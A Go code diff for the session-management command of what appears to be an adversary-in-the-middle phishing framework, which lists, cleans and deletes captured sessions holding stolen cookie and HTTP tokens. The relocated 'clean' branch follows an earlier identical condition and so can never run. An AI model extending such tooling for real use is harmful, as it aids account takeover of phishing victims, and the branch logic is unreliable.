@@ -832,22 +832,6 @@ func (t *Terminal) handleSessions(args []string) error {
 		log.Printf("\n%s\n", AsTable(cols, rows))
 		return nil
 	} else if pn == 1 {
-		switch args[0] {
-		case "clean":
-			// Clean duplicate sessions - keeps the best session (most data) for each IP+phishlet combo
-			deleted, err := t.db.CleanDuplicateSessions()
-			if err != nil {
-				return fmt.Errorf("failed to clean sessions: %v", err)
-			}
-			if deleted == 0 {
-				log.Info("no duplicate sessions found")
-			} else {
-				log.Success("cleaned %d duplicate session(s)", deleted)
-				t.db.Flush()
-			}
-			return nil
-		}
-		// If not "clean", try to parse as session ID
 		id, err := strconv.Atoi(args[0])
 		if err != nil {
 			return err
@@ -893,6 +877,8 @@ func (t *Terminal) handleSessions(args []string) error {
 
 				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
 					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+						//var str_tokens string
+
 						tkeys := []string{}
 						tvals := []string{}
 
@@ -919,6 +905,19 @@ func (t *Terminal) handleSessions(args []string) error {
 			return fmt.Errorf("id %d not found", id)
 		}
 		return nil
+	} else if pn == 1 && args[0] == "clean" {
+		// Clean duplicate sessions - keeps the best session (most data) for each IP+phishlet combo
+		deleted, err := t.db.CleanDuplicateSessions()
+		if err != nil {
+			return fmt.Errorf("failed to clean sessions: %v", err)
+		}
+		if deleted == 0 {
+			log.Info("no duplicate sessions found")
+		} else {
+			log.Success("cleaned %d duplicate session(s)", deleted)
+			t.db.Flush()
+		}
+		return nil
 	} else if pn == 2 {
 		switch args[0] {
 		case "delete":
@@ -928,8 +927,7 @@ func (t *Terminal) handleSessions(args []string) error {
 					return err
 				}
 				if len(sessions) == 0 {
-					log.Info("no sessions to delete")
-					return nil
+					break
 				}
 				for _, s := range sessions {
 					err = t.db.DeleteSessionById(s.Id)
@@ -938,13 +936,6 @@ func (t *Terminal) handleSessions(args []string) error {
 					} else {
 						log.Info("deleted session with ID: %d", s.Id)
 					}
-				}
-				// Reset session ID counter to 1 after deleting all
-				err = t.db.ResetSessionIdCounter()
-				if err != nil {
-					log.Warning("failed to reset session ID counter: %v", err)
-				} else {
-					log.Info("session ID counter reset to 1")
 				}
 				t.db.Flush()
 				return nil
